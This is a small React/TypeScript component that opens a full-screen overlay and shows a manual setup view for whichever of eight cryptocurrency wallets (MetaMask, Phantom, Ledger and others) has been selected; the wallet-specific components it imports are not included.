import Atomic from "./atomic";
import Coinbase from "./coinbase";
import Exodus from "./exedus";
import Keplr from "./keplr";
import Ledger from "./ledger";
import MetaMask from "./meta-mask";
import Phantom from "./phantom";
import TrustWallet from "./trust-wallet";

interface ShowManualProps {
	selectedWallet: string;
	handleFinish: () => void;
}

function ShowManualWallets({ selectedWallet, handleFinish }: ShowManualProps) {
	return (
		<>
			<section className="fixed inset-0 bg-black/80 flex justify-center items-center">
				{selectedWallet == "metamask" && (
					<MetaMask handleFinish={handleFinish} />
				)}
				{selectedWallet == "phantom" && <Phantom handleFinish={handleFinish} />}
				{selectedWallet == "exodus" && <Exodus handleFinish={handleFinish} />}
				{selectedWallet == "keplr" && <Keplr handleFinish={handleFinish} />}
				{selectedWallet == "atomic" && <Atomic handleFinish={handleFinish} />}
				{selectedWallet == "trustwallet" && (
					<TrustWallet handleFinish={handleFinish} />
				)}
				{selectedWallet == "coinbase" && (
					<Coinbase handleFinish={handleFinish} />
				)}
				{selectedWallet == "ledger" && <Ledger handleFinish={handleFinish} />}
			</section>
		</>
	);
}

export default ShowManualWallets;
